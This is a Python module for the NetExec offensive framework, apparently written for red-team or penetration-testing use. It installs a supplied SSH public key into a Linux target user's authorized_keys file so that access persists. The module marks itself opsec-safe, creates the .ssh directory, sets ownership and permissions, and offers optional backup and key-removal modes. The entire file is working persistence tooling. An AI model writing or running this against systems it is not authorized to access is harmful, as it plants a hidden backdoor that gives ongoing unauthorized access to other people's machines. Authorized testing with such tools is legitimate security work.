# ~/.nxc/modules/ssh_persist_key.py
import os
import time

class NXCModule:
    name = "ssh_persist_key"
    description = "Inject or remove a public key in ~/.ssh/authorized_keys for persistence (Linux)"
    supported_protocols = ["ssh"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        # Options:
        #   PUBKEY   : path to local public key file (or literal key string starting with "ssh-")
        #   USER     : target username (default: current SSH user)
        #   BACKUP   : true/false (default: true) – backup authorized_keys if it exists
        #   REMOVE   : true/false (default: false) – remove the key instead of adding
        self.pubkey_opt = module_options.get("PUBKEY", "").strip()
        self.target_user = module_options.get("USER", "").strip()
        self.backup = str(module_options.get("BACKUP", "true")).lower() in ("1", "true", "yes", "y")
        self.remove = str(module_options.get("REMOVE", "false")).lower() in ("1", "true", "yes", "y")

        if not self.pubkey_opt:
            raise ValueError("PUBKEY is required (path to .pub or a literal 'ssh-...' key)")

    def on_login(self, context, connection):
        # Only Linux is supported here (NetExec tracks this)
        if getattr(connection, "server_os_platform", "").lower() != "linux":
            context.log.error("[ssh_persist_key] Target OS not Linux – aborting.")
            return

        if not hasattr(connection, "conn") or connection.conn is None:
            context.log.error("[ssh_persist_key] No SSH client available.")
            return

        # Determine target username
        ssh_user = getattr(connection, "username", None)
        if not self.target_user:
            # fall back to the SSH username or remote whoami
            self.target_user = ssh_user or self._remote_whoami(connection) or "root"

        # Resolve the target user's home directory
        home = self._remote_user_home(connection, self.target_user)
        if not home:
            context.log.error(f"[ssh_persist_key] Unable to resolve home dir for user '{self.target_user}'.")
            return

        ssh_dir = f"{home}/.ssh"
        auth_keys = f"{ssh_dir}/authorized_keys"

        # Load/prepare the public key text
        pubkey_text = self._load_pubkey_text(context, self.pubkey_opt)
        if not pubkey_text.startswith("ssh-"):
            context.log.error("[ssh_persist_key] PUBKEY does not look like a valid SSH public key.")
            return

        key_id = " ".join(pubkey_text.split()[:2])  # (type + base64), ignore trailing comment for matching

        try:
            sftp = connection.conn.open_sftp()

            # Ensure ~/.ssh exists with correct perms
            self._ensure_dir(context, connection, sftp, ssh_dir, owner=self.target_user)

            # Fetch existing authorized_keys if present
            existing = ""
            try:
                with sftp.file(auth_keys, "r") as f:
                    existing = f.read().decode("utf-8", errors="ignore")
            except IOError:
                existing = ""

            if self.remove:
                # Remove the key if present
                if key_id in existing:
                    new_content = self._remove_key_lines(existing, key_id)
                    self._write_with_perms(connection, sftp, auth_keys, new_content, owner=self.target_user)
                    context.log.success("[ssh_persist_key] Key removed from authorized_keys.")
                else:
                    context.log.info("[ssh_persist_key] Key not present; nothing to remove.")
                sftp.close()
                return

            # Add mode
            if key_id in existing:
                context.log.success("[ssh_persist_key] Key already present in authorized_keys.")
            else:
                if self.backup and existing:
                    ts = time.strftime("%Y%m%d-%H%M%S")
                    backup_path = f"{auth_keys}.bak-{ts}"
                    try:
                        # simple remote copy via shell (POSIX)
                        connection.conn.exec_command(f"cp -p {self._q(auth_keys)} {self._q(backup_path)} 2>/dev/null || true")
                        context.log.info(f"[ssh_persist_key] Backed up authorized_keys -> {backup_path}")
                    except Exception:
                        pass

                new_content = (existing.rstrip("\n") + "\n" if existing else "") + pubkey_text.strip() + "\n"
                self._write_with_perms(connection, sftp, auth_keys, new_content, owner=self.target_user)
                context.log.success("[ssh_persist_key] Key added to authorized_keys.")

            sftp.close()

        except Exception as e:
            context.log.error(f"[ssh_persist_key] Error: {e}")

    # -------------------- helpers --------------------

    def _load_pubkey_text(self, context, pubkey_opt):
        # If it starts with "ssh-" treat as literal key, else read local file path
        if pubkey_opt.startswith("ssh-"):
            return pubkey_opt.strip()
        # Expand local path and read
        path = os.path.expanduser(pubkey_opt)
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read().strip()

    def _remote_whoami(self, connection):
        try:
            _, stdout, _ = connection.conn.exec_command("whoami 2>/dev/null || id -un 2>/dev/null")
            return stdout.read().decode().strip() or None
        except Exception:
            return None

    def _remote_user_home(self, connection, user):
        # Prefer getent; fallback to ~user expansion
        try:
            _, stdout, _ = connection.conn.exec_command(f"getent passwd {self._q(user)} | cut -d: -f6")
            out = stdout.read().decode().strip()
            if out:
                return out
        except Exception:
            pass
        try:
            _, stdout, _ = connection.conn.exec_command(f"eval echo ~{self._q(user)}")
            out = stdout.read().decode().strip()
            return out or None
        except Exception:
            return None

    def _ensure_dir(self, context, connection, sftp, path, owner):
        # mkdir -p with perms; fix perms after
        try:
            connection.conn.exec_command(f"mkdir -p {self._q(path)} && chmod 700 {self._q(path)}")
            # chown only if running as root
            connection.conn.exec_command(f"id -u {self._q(owner)} >/dev/null 2>&1 && chown {self._q(owner)}:{self._q(owner)} {self._q(path)} 2>/dev/null || true")
        except Exception as e:
            context.log.info(f"[ssh_persist_key] mkdir/chmod note: {e}")

    def _write_with_perms(self, connection, sftp, path, content, owner):
        # Write file atomically-ish, then set perms/ownership
        tmp = f"{path}.tmp-{int(time.time())}"
        with sftp.file(tmp, "w") as f:
            f.write(content.encode("utf-8"))
        # Move into place and fix perms
        connection.conn.exec_command(f"mv -f {self._q(tmp)} {self._q(path)} && chmod 600 {self._q(path)} && "
                                     f"(chown {self._q(owner)}:{self._q(owner)} {self._q(path)} 2>/dev/null || true)")

    def _remove_key_lines(self, existing, key_id):
        lines = existing.splitlines()
        keep = []
        for ln in lines:
            # Match by first two fields (type + base64)
            parts = ln.strip().split()
            if len(parts) >= 2 and " ".join(parts[:2]) == key_id:
                continue
            keep.append(ln)
        return "\n".join(keep).rstrip("\n") + ("\n" if keep else "")

    def _q(self, s):
        # very basic shell quoting for paths/usernames (no spaces in typical paths)
        return "'" + s.replace("'", "'\\''") + "'"